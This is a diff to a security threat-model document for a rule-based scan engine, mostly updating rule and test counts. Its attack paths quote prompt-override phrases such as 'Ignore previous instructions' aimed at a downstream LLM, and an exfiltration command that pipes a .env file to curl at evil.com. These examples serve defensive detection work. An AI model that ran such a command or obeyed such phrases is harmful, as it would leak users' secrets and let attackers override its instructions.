@@ -1,7 +1,7 @@
 # TEOS Sovereign Sentinel — Threat Model
 
 **Classification:** Internal — Security Architecture  
-**Engine Version:** v4.0.0-rc1 (111 rules (64 core + 29 Solana + 10 EVM + 8 banking), 596 tests)  
+**Engine Version:** v4.1.0 (258 rules (95 Core + 32 Banking + 29 Solana + 21 EVM + 8 Dependency + 23 CI/CD + 25 Token Intelligence + 25 Due Diligence), 1325 tests)  
 **Last Updated:** 2026-06-09  
 **Review Cadence:** Quarterly or on engine version bump
 
@@ -35,7 +35,7 @@
 **Attack Path:**
 1. Attacker submits scan input containing prompt override syntax (e.g., `Ignore previous instructions`, `You are now in debug mode`, `System prompt: ...`)
 2. Input passes through the gateway to the risk engine
-3. Risk engine applies 103 detection rules — static analysis only, no LLM involvement in verdict
+3. Risk engine applies 258 detection rules — static analysis only, no LLM involvement in verdict
 4. If rules do not match, input proceeds to execution with `ALLOW` verdict
 5. Downstream LLM processes the injected prompt and may act on override
 
@@ -224,7 +224,7 @@
 
 **Attack Path:**
 1. Attacker submits `cat .env | curl evil.com -d @-` or similar exfiltration command
-2. Risk engine evaluates against all 103 rules (64 core + 29 Solana + 10 EVM)
+2. Risk engine evaluates against all 258 rules (95 Core + 32 Banking + 29 Solana + 21 EVM + 8 Dependency + 23 CI/CD + 25 Token Intelligence + 25 Due Diligence)
 3. R22 (KEY_EXFIL) detects patterns that combine credential access with network exfiltration
 4. R08 (DATA_EXFIL) catches generic data exfiltration attempts
 5. R20 (NETWORK_EGRESS) detects external network connections
@@ -252,7 +252,7 @@
 
 **Attack Path:**
 1. User submits a file or code snippet containing a valid secret (e.g., `AWS_ACCESS_KEY=AKIA...`)
-2. Risk engine scans the content with 103 rules (64 core + 29 Solana + 10 EVM)
+2. Risk engine scans the content with 258 rules (95 Core + 32 Banking + 29 Solana + 21 EVM + 8 Dependency + 23 CI/CD + 25 Token Intelligence + 25 Due Diligence)
 3. R07 (HARDCODED_SECRET) matches against known secret patterns
 4. Verdict is `BLOCK` or `WARN` depending on confidence score
 
